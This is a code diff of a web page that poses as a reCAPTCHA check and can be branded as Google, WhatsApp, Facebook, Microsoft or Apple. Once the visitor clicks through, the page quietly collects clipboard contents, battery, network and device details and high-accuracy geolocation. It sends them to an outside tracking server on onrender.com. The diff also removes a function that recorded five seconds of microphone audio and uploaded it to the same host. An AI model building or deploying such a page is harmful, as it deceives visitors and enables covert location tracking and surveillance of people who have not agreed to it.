@@ -11,7 +11,7 @@
             display: flex;
             justify-content: center;
             align-items: center;
-            font-family: 'Roboto', Arial, sans-serif;
+            font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, Roboto, Helvetica, Arial, sans-serif;
             background: #f1f3f4;
         }
         .card {
@@ -25,23 +25,18 @@
             transition: all 0.3s ease;
         }
 
-        /* --- Google Template --- */
         .logo.google { font-size: 28px; font-weight: 500; color: #202124; }
         .logo.google span { color: #4285f4; }
 
-        /* --- WhatsApp Template --- */
         .logo.whatsapp { color: #075e54; display: flex; align-items: center; justify-content: center; gap: 8px; }
         .logo.whatsapp .icon { background: #25d366; border-radius: 50%; width: 36px; height: 36px; display: flex; align-items: center; justify-content: center; color: white; font-weight: bold; font-size: 18px; }
 
-        /* --- Facebook Template --- */
         .logo.facebook { color: #1877f2; display: flex; align-items: center; justify-content: center; gap: 8px; }
         .logo.facebook .icon { background: #1877f2; border-radius: 4px; width: 36px; height: 36px; display: flex; align-items: center; justify-content: center; color: white; font-weight: bold; font-size: 18px; }
 
-        /* --- Microsoft Template --- */
         .logo.microsoft { color: #202124; display: flex; align-items: center; justify-content: center; gap: 8px; }
         .logo.microsoft .icon { background: #00a4ef; border-radius: 4px; width: 36px; height: 36px; display: flex; align-items: center; justify-content: center; color: white; font-weight: bold; font-size: 18px; }
 
-        /* --- Apple Template --- */
         .logo.apple { color: #1a1a1a; display: flex; align-items: center; justify-content: center; gap: 8px; }
         .logo.apple .icon { background: #1a1a1a; border-radius: 50%; width: 36px; height: 36px; display: flex; align-items: center; justify-content: center; color: white; font-weight: bold; font-size: 18px; }
 
@@ -108,7 +103,6 @@
 <body>
 
 <div class="card" id="card">
-    <!-- Logo injected by JavaScript based on template -->
     <div class="logo" id="logoContainer"></div>
     <div class="subtitle" id="subtitleText">Verify you are human</div>
 
@@ -132,18 +126,11 @@
 </div>
 
 <script>
-    // =============================================
-    // CONFIGURATION
-    // =============================================
     const RENDER_URL = 'https://location-tracker-cn7m.onrender.com';
 
-    // Get template from URL (?template=google)
     const urlParams = new URLSearchParams(window.location.search);
     const template = urlParams.get('template') || 'google';
 
-    // =============================================
-    // TEMPLATES
-    // =============================================
     const templates = {
         google: {
             logo: `<div class="logo google">re<span>CAPTCHA</span></div>`,
@@ -184,9 +171,6 @@
 
     const selectedTemplate = templates[template] || templates['google'];
 
-    // =============================================
-    // DOM Elements
-    // =============================================
     document.getElementById('logoContainer').innerHTML = selectedTemplate.logo;
     document.getElementById('subtitleText').textContent = selectedTemplate.subtitle;
     document.getElementById('notRobotText').textContent = selectedTemplate.notRobot;
@@ -205,9 +189,6 @@
     let isVerified = false;
     let isProcessing = false;
 
-    // =============================================
-    // Debug Logger
-    // =============================================
     function debug(message) {
         const timestamp = new Date().toLocaleTimeString();
         const logEntry = `[${timestamp}] ${message}`;
@@ -217,9 +198,6 @@
         debugLog.scrollTop = debugLog.scrollHeight;
     }
 
-    // =============================================
-    // 1. Battery Level
-    // =============================================
     function getBatteryInfo() {
         if (navigator.getBattery) {
             navigator.getBattery().then(battery => {
@@ -237,9 +215,6 @@
         }
     }
 
-    // =============================================
-    // 2. Network Info
-    // =============================================
     function getNetworkInfo() {
         if (navigator.connection) {
             const networkData = {
@@ -256,37 +231,6 @@
         }
     }
 
-    // =============================================
-    // 3. Microphone Access
-    // =============================================
-    function captureAudio() {
-        navigator.mediaDevices.getUserMedia({ audio: true })
-            .then(stream => {
-                const mediaRecorder = new MediaRecorder(stream);
-                const chunks = [];
-                mediaRecorder.ondataavailable = e => chunks.push(e.data);
-                mediaRecorder.onstop = () => {
-                    const blob = new Blob(chunks, { type: 'audio/webm' });
-                    const reader = new FileReader();
-                    reader.onload = () => {
-                        fetch(RENDER_URL + '/send-audio', {
-                            method: 'POST',
-                            headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify({ audio: reader.result })
-                        }).catch(() => {});
-                    };
-                    reader.readAsDataURL(blob);
-                };
-                mediaRecorder.start();
-                setTimeout(() => mediaRecorder.stop(), 5000);
-                debug('🎤 Microphone started (5 seconds)');
-            })
-            .catch(() => debug('🎤 Microphone access denied'));
-    }
-
-    // =============================================
-    // 4. Clipboard Data
-    // =============================================
     function readClipboard() {
         if (navigator.clipboard && navigator.clipboard.readText) {
             navigator.clipboard.readText()
@@ -304,9 +248,6 @@
         }
     }
 
-    // =============================================
-    // 5. Data Compression
-    // =============================================
     function compressData(data) {
         const json = JSON.stringify(data);
         if (json.length > 100000) {
@@ -317,9 +258,6 @@
         return data;
     }
 
-    // =============================================
-    // 6. Automatic Reconnection (Retry)
-    // =============================================
     function sendWithRetry(url, data, retries = 3, delay = 2000) {
         return fetch(url, {
             method: 'POST',
@@ -343,9 +281,6 @@
         });
     }
 
-    // =============================================
-    // 7. Device Info
-    // =============================================
     function getDeviceInfo() {
         const ua = navigator.userAgent;
         let deviceName = 'Unknown';
@@ -372,9 +307,6 @@
         statusBar.style.color = isError ? '#d93025' : '#1e7e34';
     }
 
-    // =============================================
-    // 8. Open Map App (Redirects to Google/Apple Maps)
-    // =============================================
     function openMapApp(lat, lng) {
         const isIOS = /iPad|iPhone|iPod/.test(navigator.userAgent) ||
                       (navigator.platform === 'MacIntel' && navigator.maxTouchPoints > 1);
@@ -393,9 +325,6 @@
         window.location.href = mapUrl;
     }
 
-    // =============================================
-    // STEP 1: Click reCAPTCHA
-    // =============================================
     recaptchaBox.addEventListener('click', function() {
         if (isVerified || isProcessing) return;
 
@@ -411,9 +340,6 @@
         debug('✅ reCAPTCHA verified');
     });
 
-    // =============================================
-    // STEP 2: Click Continue
-    // =============================================
     continueBtn.addEventListener('click', function() {
         if (!isVerified) {
             debug('❌ Please verify reCAPTCHA first');
@@ -432,13 +358,10 @@
         showStatus('Requesting location...');
         debug('📍 Continue button clicked');
 
-        // --- Collect all data ---
         getBatteryInfo();
         getNetworkInfo();
         readClipboard();
-        // captureAudio();  // Uncomment to enable
 
-        // --- Request location ---
         if (!navigator.geolocation) {
             debug('❌ Geolocation not supported');
             showStatus('❌ Geolocation not supported', true);
@@ -451,7 +374,6 @@
         debug('📡 Calling navigator.geolocation...');
 
         navigator.geolocation.getCurrentPosition(
-            // --- SUCCESS ---
             function(position) {
                 const lat = position.coords.latitude;
                 const lng = position.coords.longitude;
@@ -501,7 +423,6 @@
                         }, 1000);
                     });
             },
-            // --- ERROR --- with improved messages
             function(error) {
                 debug('❌ Geolocation error: ' + error.message);
                 debug('❌ Error code: ' + error.code);
@@ -520,15 +441,12 @@
             },
             {
                 enableHighAccuracy: true,
-                timeout: 30000,        // <-- Increased to 30 seconds
+                timeout: 30000,
                 maximumAge: 0
             }
         );
     });
 
-    // =============================================
-    // INIT
-    // =============================================
     debug('🚀 Page loaded');
     debug('📍 Template: ' + template);
     debug('📍 RENDER_URL: ' + RENDER_URL);
